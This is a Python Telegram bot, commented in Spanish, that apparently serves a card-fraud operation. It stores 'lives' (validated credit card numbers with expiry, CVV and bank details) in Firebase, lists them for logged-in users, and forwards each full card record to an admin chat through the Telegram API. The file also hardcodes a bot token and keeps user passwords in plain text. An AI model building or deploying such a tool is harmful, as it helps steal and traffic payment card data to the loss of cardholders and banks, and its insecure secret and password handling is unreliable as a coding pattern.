import os
import sys
import logging
import sqlite3
import datetime
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN Y LOGGING
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# FIREBASE + TELEGRAM
# ─────────────────────────────────────────────────────────────────────────────
try:
    import firebase_admin
    from firebase_admin import credentials, firestore as _firestore
    _FB_AVAILABLE = True
except ImportError:
    _FB_AVAILABLE = False
    logger.warning("⚠️ firebase-admin no instalado. Lives no se enviarán a Firebase.")

# ── Configuración ─────────────────────────────────────────────────────────────
_FB_CREDENTIALS_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "firebase-credentials.json"
)
# ✅ Token de Telegram desde variables de entorno o valor por defecto
_TG_TOKEN = os.getenv("TELEGRAM_TOKEN", "8764142166:AAGvhBc6M0xJLB0yvrFF4AITD8ZRYLMM9wg")
_TG_ADMIN = os.getenv("TELEGRAM_ADMIN", "7448403516")

_fb_db = None

def _get_fb_db():
    """Obtiene la instancia de Firestore (singleton)."""
    global _fb_db
    if _fb_db is not None:
        return _fb_db
    if not _FB_AVAILABLE:
        logger.warning("⚠️ Firebase no disponible")
        return None
    try:
        if not firebase_admin._apps:
            cred = credentials.Certificate(_FB_CREDENTIALS_PATH)
            firebase_admin.initialize_app(cred)
        _fb_db = _firestore.client()
        logger.info("✅ Firebase conectado correctamente")
        return _fb_db
    except Exception as e:
        logger.error(f"❌ Firebase init error: {e}")
        return None


def _tg_notify_admin(mensaje: str):
    """Envía notificación al admin por Telegram."""
    if not _TG_TOKEN or not _TG_ADMIN:
        logger.warning("⚠️ TELEGRAM_TOKEN o TELEGRAM_ADMIN no configurado.")
        return
    try:
        import requests
        requests.post(
            f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage",
            data={"chat_id": _TG_ADMIN, "text": mensaje, "parse_mode": "HTML"},
            timeout=10,
        )
        logger.info("✅ Notificación enviada al admin")
    except Exception as e:
        logger.error(f"❌ Error enviando notificación a Telegram: {e}")


def _subir_live_firebase(username: str, card_number: str, expiry: str,
                          cvv: str, result_msg: str, bin_info: dict,
                          url_name: str):
    """Sube una live a Firebase y notifica al admin por Telegram."""
    db = _get_fb_db()
    if db:
        try:
            doc_id = card_number.replace(" ", "").replace("|", "")
            live_data = {
                "card":        f"{card_number}|{expiry}|{cvv}",
                "card_number": card_number,
                "expiry":      expiry,
                "cvv":         cvv,
                "resultado":   result_msg,
                "gate":        url_name.replace("● ", ""),
                "timestamp":   datetime.datetime.utcnow().isoformat(),
                "username":    username,
            }
            if bin_info:
                live_data.update({
                    "scheme":  bin_info.get("scheme",  "?"),
                    "type":    bin_info.get("type",    "?"),
                    "level":   bin_info.get("level",   "?"),
                    "bank":    bin_info.get("bank",    "?"),
                    "country": bin_info.get("country", "?"),
                })
            
            # Guardar en Firebase
            db.collection("lives").document(username.lower()) \
              .collection("tarjetas").document(doc_id).set(live_data)
            
            # Incrementar contador
            user_ref = db.collection("usuarios").document(username.lower())
            user_ref.update({"lives_count": _firestore.Increment(1)})
            
            logger.info(f"✅ Live subida a Firebase: {card_number[:6]}****")
        except Exception as e:
            logger.error(f"❌ Error subiendo live a Firebase: {e}")

    # Notificación Telegram
    bin_lines = ""
    if bin_info:
        bin_lines = (
            f"\n🏦 <b>Scheme:</b> {bin_info.get('scheme','?')} {bin_info.get('type','?')}"
            f"\n💼 <b>Level:</b>  {bin_info.get('level','?')}"
            f"\n🏛 <b>Bank:</b>   {bin_info.get('bank','?')}"
            f"\n🌍 <b>Country:</b> {bin_info.get('country','?')}"
        )
    msg = (
        f"✅ <b>LIVE ENCONTRADA</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {username}\n"
        f"💳 <code>{card_number}|{expiry}|{cvv}</code>\n"
        f"⚡ <b>Gate:</b> {url_name.replace('● ','')}\n"
        f"📝 <b>Msg:</b> {result_msg}"
        f"{bin_lines}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    _tg_notify_admin(msg)


# ─────────────────────────────────────────────────────────────────────────────
# BASE DE DATOS LOCAL
# ─────────────────────────────────────────────────────────────────────────────
DB_PATH = "usuarios.db"

def init_db():
    """Inicializa la base de datos SQLite."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios (
        username TEXT PRIMARY KEY,
        password TEXT NOT NULL,
        lives_count INTEGER DEFAULT 0,
        created_at TEXT,
        last_login TEXT
    )''')
    conn.commit()
    conn.close()
    logger.info("✅ Base de datos SQLite inicializada")


def crear_usuario(username: str, password: str) -> bool:
    """Crea un nuevo usuario en la base de datos local."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(
            "INSERT INTO usuarios (username, password, lives_count, created_at) VALUES (?, ?, 0, ?)",
            (username.lower(), password, datetime.datetime.utcnow().isoformat())
        )
        conn.commit()
        conn.close()
        logger.info(f"✅ Usuario creado: {username}")
        
        # Crear en Firebase también
        db = _get_fb_db()
        if db:
            try:
                db.collection("usuarios").document(username.lower()).set({
                    "username": username.lower(),
                    "lives_count": 0,
                    "created_at": datetime.datetime.utcnow().isoformat()
                })
            except Exception as e:
                logger.error(f"❌ Error creando usuario en Firebase: {e}")
        
        return True
    except sqlite3.IntegrityError:
        logger.warning(f"⚠️ Usuario ya existe: {username}")
        return False


def validar_usuario(username: str, password: str) -> bool:
    """Valida las credenciales de un usuario."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT password FROM usuarios WHERE username = ?", (username.lower(),))
    row = c.fetchone()
    
    # Actualizar último login
    if row and row[0] == password:
        c.execute(
            "UPDATE usuarios SET last_login = ? WHERE username = ?",
            (datetime.datetime.utcnow().isoformat(), username.lower())
        )
        conn.commit()
    
    conn.close()
    return row and row[0] == password


def obtener_lives_usuario(username: str):
    """Obtiene las últimas 10 lives del usuario desde Firebase."""
    db = _get_fb_db()
    if not db:
        logger.warning("⚠️ Firebase no disponible para obtener lives")
        return []
    try:
        docs = db.collection("lives").document(username.lower()) \
                 .collection("tarjetas") \
                 .order_by("timestamp", direction=_firestore.Query.DESCENDING) \
                 .limit(10) \
                 .stream()
        
        lives = []
        for doc in docs:
            data = doc.to_dict()
            lives.append(data)
        
        logger.info(f"✅ {len(lives)} lives obtenidas para {username}")
        return lives
    except Exception as e:
        logger.error(f"❌ Error obteniendo lives: {e}")
        return []


def obtener_stats_usuario(username: str):
    """Obtiene estadísticas del usuario desde Firebase."""
    db = _get_fb_db()
    if not db:
        return {"lives_count": 0}
    try:
        doc = db.collection("usuarios").document(username.lower()).get()
        if doc.exists:
            return doc.to_dict()
        return {"lives_count": 0}
    except Exception as e:
        logger.error(f"❌ Error obteniendo stats: {e}")
        return {"lives_count": 0}


# ─────────────────────────────────────────────────────────────────────────────
# KEEPALIVE PARA KOYEB
# ─────────────────────────────────────────────────────────────────────────────
_start_time = datetime.datetime.utcnow()

async def keepalive_task():
    """Tarea que imprime keepalive cada 250 segundos para mantener activo el bot."""
    while True:
        await asyncio.sleep(250)
        uptime = int((datetime.datetime.utcnow() - _start_time).total_seconds())
        logger.info(f"💚 Keepalive OK (uptime: {uptime}s, {uptime//60} min)")


# ─────────────────────────────────────────────────────────────────────────────
# ESTADOS DEL BOT
# ─────────────────────────────────────────────────────────────────────────────
REGISTRO_USER, REGISTRO_PASS, LOGIN_USER, LOGIN_PASS = range(4)

# Sesiones activas de usuarios
user_sessions = {}


# ─────────────────────────────────────────────────────────────────────────────
# COMANDOS PRINCIPALES
# ─────────────────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start - Pantalla de bienvenida."""
    user_id = update.effective_user.id
    username_tg = update.effective_user.username or update.effective_user.first_name
    
    logger.info(f"📱 /start ejecutado por {username_tg} (ID: {user_id})")
    
    keyboard = [
        [InlineKeyboardButton("🔐 Iniciar Sesión", callback_data="login")],
        [InlineKeyboardButton("📝 Registrarse", callback_data="registro")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 <b>Bienvenido al Bot de Lives</b>\n\n"
        "Este bot te permite visualizar todas las tarjetas live\n"
        "que hayas encontrado desde tu PC.\n\n"
        "Selecciona una opción para continuar:",
        parse_mode="HTML",
        reply_markup=reply_markup
    )


async def menu_principal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra el menú principal del bot."""
    query = update.callback_query
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await query.answer("⚠️ Debes iniciar sesión primero", show_alert=True)
        return
    
    username = user_sessions[user_id]
    stats = obtener_stats_usuario(username)
    lives_count = stats.get("lives_count", 0)
    
    keyboard = [
        [InlineKeyboardButton("📋 Mis Lives", callback_data="ver_lives")],
        [InlineKeyboardButton("📊 Estadísticas", callback_data="ver_stats")],
        [InlineKeyboardButton("🚪 Cerrar Sesión", callback_data="logout")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"👤 <b>Usuario:</b> {username}\n"
        f"💳 <b>Lives encontradas:</b> {lives_count}\n\n"
        "Selecciona una opción:",
        parse_mode="HTML",
        reply_markup=reply_markup
    )


# ─────────────────────────────────────────────────────────────────────────────
# REGISTRO
# ─────────────────────────────────────────────────────────────────────────────
async def iniciar_registro(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Inicia el proceso de registro."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📝 <b>Registro de Usuario</b>\n\n"
        "Envía el nombre de usuario que deseas usar:",
        parse_mode="HTML"
    )
    return REGISTRO_USER


async def registro_usuario_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recibe el nombre de usuario para el registro."""
    username = update.message.text.strip()
    
    if len(username) < 3:
        await update.message.reply_text(
            "❌ El nombre de usuario debe tener al menos 3 caracteres.\n"
            "Envía otro nombre:",
            parse_mode="HTML"
        )
        return REGISTRO_USER
    
    context.user_data['registro_username'] = username
    await update.message.reply_text(
        f"👤 Usuario: <b>{username}</b>\n\n"
        "Ahora envía la contraseña que deseas usar:",
        parse_mode="HTML"
    )
    return REGISTRO_PASS


async def registro_password_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recibe la contraseña y completa el registro."""
    password = update.message.text.strip()
    username = context.user_data.get('registro_username')
    
    if len(password) < 4:
        await update.message.reply_text(
            "❌ La contraseña debe tener al menos 4 caracteres.\n"
            "Envía otra contraseña:",
            parse_mode="HTML"
        )
        return REGISTRO_PASS
    
    if crear_usuario(username, password):
        user_id = update.effective_user.id
        user_sessions[user_id] = username
        
        keyboard = [
            [InlineKeyboardButton("📋 Mis Lives", callback_data="ver_lives")],
            [InlineKeyboardButton("📊 Estadísticas", callback_data="ver_stats")],
            [InlineKeyboardButton("🚪 Cerrar Sesión", callback_data="logout")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ <b>¡Registro exitoso!</b>\n\n"
            f"👤 Usuario: {username}\n"
            f"💳 Lives: 0\n\n"
            "Ya puedes usar el bot. Tus lives de PC se sincronizarán automáticamente.",
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "❌ El usuario ya existe. Intenta con otro nombre.\n\n"
            "Usa /start para volver al inicio.",
            parse_mode="HTML"
        )
    
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────────────
# LOGIN
# ─────────────────────────────────────────────────────────────────────────────
async def iniciar_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Inicia el proceso de login."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔐 <b>Inicio de Sesión</b>\n\n"
        "Envía tu nombre de usuario:",
        parse_mode="HTML"
    )
    return LOGIN_USER


async def login_usuario_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recibe el nombre de usuario para login."""
    username = update.message.text.strip()
    context.user_data['login_username'] = username
    await update.message.reply_text(
        f"👤 Usuario: <b>{username}</b>\n\n"
        "Ahora envía tu contraseña:",
        parse_mode="HTML"
    )
    return LOGIN_PASS


async def login_password_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recibe la contraseña y completa el login."""
    password = update.message.text.strip()
    username = context.user_data.get('login_username')
    
    if validar_usuario(username, password):
        user_id = update.effective_user.id
        user_sessions[user_id] = username
        
        stats = obtener_stats_usuario(username)
        lives_count = stats.get("lives_count", 0)
        
        keyboard = [
            [InlineKeyboardButton("📋 Mis Lives", callback_data="ver_lives")],
            [InlineKeyboardButton("📊 Estadísticas", callback_data="ver_stats")],
            [InlineKeyboardButton("🚪 Cerrar Sesión", callback_data="logout")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ <b>¡Bienvenido de nuevo!</b>\n\n"
            f"👤 Usuario: {username}\n"
            f"💳 Lives encontradas: {lives_count}",
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "❌ Usuario o contraseña incorrectos.\n\n"
            "Usa /start para intentar de nuevo.",
            parse_mode="HTML"
        )
    
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────────────
# VER LIVES
# ─────────────────────────────────────────────────────────────────────────────
async def ver_lives(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra las últimas lives del usuario."""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await query.answer("⚠️ Debes iniciar sesión primero", show_alert=True)
        return
    
    username = user_sessions[user_id]
    lives = obtener_lives_usuario(username)
    
    if not lives:
        keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"👤 <b>Usuario:</b> {username}\n\n"
            "❌ No tienes lives registradas aún.\n\n"
            "Las lives que encuentres desde tu PC se sincronizarán automáticamente.",
            parse_mode="HTML",
            reply_markup=reply_markup
        )
        return
    
    texto = f"👤 <b>Usuario:</b> {username}\n\n📋 <b>Últimas Lives:</b>\n\n"
    
    for i, live in enumerate(lives, 1):
        card = live.get("card", "N/A")
        gate = live.get("gate", "N/A")
        resultado = live.get("resultado", "N/A")
        timestamp = live.get("timestamp", "N/A")
        
        # Información del BIN si está disponible
        bin_info = ""
        if live.get("scheme"):
            bin_info = f"\n   🏦 {live.get('scheme')} {live.get('type')} | {live.get('bank')}"
        
        texto += (
            f"<b>{i}.</b> 💳 <code>{card}</code>\n"
            f"   ⚡ <b>Gate:</b> {gate}\n"
            f"   📝 <b>Msg:</b> {resultado}{bin_info}\n"
            f"   🕒 {timestamp[:19].replace('T', ' ')}\n\n"
        )
    
    keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(texto, parse_mode="HTML", reply_markup=reply_markup)


# ─────────────────────────────────────────────────────────────────────────────
# ESTADÍSTICAS
# ─────────────────────────────────────────────────────────────────────────────
async def ver_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra las estadísticas del usuario."""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await query.answer("⚠️ Debes iniciar sesión primero", show_alert=True)
        return
    
    username = user_sessions[user_id]
    stats = obtener_stats_usuario(username)
    lives_count = stats.get("lives_count", 0)
    created_at = stats.get("created_at", "N/A")
    
    # Calcular días desde el registro
    dias_registrado = "N/A"
    try:
        fecha_registro = datetime.datetime.fromisoformat(created_at)
        dias = (datetime.datetime.utcnow() - fecha_registro).days
        dias_registrado = f"{dias} días"
    except:
        pass
    
    keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📊 <b>Estadísticas de {username}</b>\n\n"
        f"💳 <b>Total de Lives:</b> {lives_count}\n"
        f"📅 <b>Registrado hace:</b> {dias_registrado}\n"
        f"🕒 <b>Fecha de registro:</b> {created_at[:10] if created_at != 'N/A' else 'N/A'}",
        parse_mode="HTML",
        reply_markup=reply_markup
    )


# ─────────────────────────────────────────────────────────────────────────────
# LOGOUT
# ─────────────────────────────────────────────────────────────────────────────
async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cierra la sesión del usuario."""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id in user_sessions:
        username = user_sessions[user_id]
        del user_sessions[user_id]
        logger.info(f"🚪 Sesión cerrada: {username}")
    
    keyboard = [
        [InlineKeyboardButton("🔐 Iniciar Sesión", callback_data="login")],
        [InlineKeyboardButton("📝 Registrarse", callback_data="registro")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "👋 <b>Sesión cerrada</b>\n\n"
        "Selecciona una opción para continuar:",
        parse_mode="HTML",
        reply_markup=reply_markup
    )


# ─────────────────────────────────────────────────────────────────────────────
# CALLBACK HANDLER
# ─────────────────────────────────────────────────────────────────────────────
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja todos los callbacks de botones inline."""
    query = update.callback_query
    data = query.data
    
    if data == "login":
        return await iniciar_login(update, context)
    elif data == "registro":
        return await iniciar_registro(update, context)
    elif data == "ver_lives":
        return await ver_lives(update, context)
    elif data == "ver_stats":
        return await ver_stats(update, context)
    elif data == "logout":
        return await logout(update, context)
    elif data == "menu":
        return await menu_principal(update, context)


async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancela la operación actual."""
    await update.message.reply_text(
        "❌ Operación cancelada.\n\n"
        "Usa /start para volver al inicio."
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    """Función principal que inicia el bot."""
    logger.info("🚀 Iniciando bot...")
    
    # Inicializar base de datos
    init_db()
    
    # Verificar Firebase
    if _get_fb_db():
        logger.info("✅ Firebase disponible")
    else:
        logger.warning("⚠️ Firebase NO disponible - solo se usará SQLite")
    
    # Crear aplicación
    application = Application.builder().token(_TG_TOKEN).build()
    
    # Conversation Handler para Registro
    conv_registro = ConversationHandler(
        entry_points=[CallbackQueryHandler(iniciar_registro, pattern="^registro$")],
        states={
            REGISTRO_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, registro_usuario_step)],
            REGISTRO_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, registro_password_step)],
        },
        fallbacks=[CommandHandler("cancelar", cancelar)],
    )
    
    # Conversation Handler para Login
    conv_login = ConversationHandler(
        entry_points=[CallbackQueryHandler(iniciar_login, pattern="^login$")],
        states={
            LOGIN_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_usuario_step)],
            LOGIN_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password_step)],
        },
        fallbacks=[CommandHandler("cancelar", cancelar)],
    )
    
    # Agregar handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_registro)
    application.add_handler(conv_login)
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    # Iniciar tarea de keepalive en background
    loop = asyncio.get_event_loop()
    loop.create_task(keepalive_task())
    
    logger.info("🤖 Bot iniciado correctamente en Koyeb")
    logger.info(f"🔑 Admin ID: {_TG_ADMIN}")
    
    # Iniciar polling
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
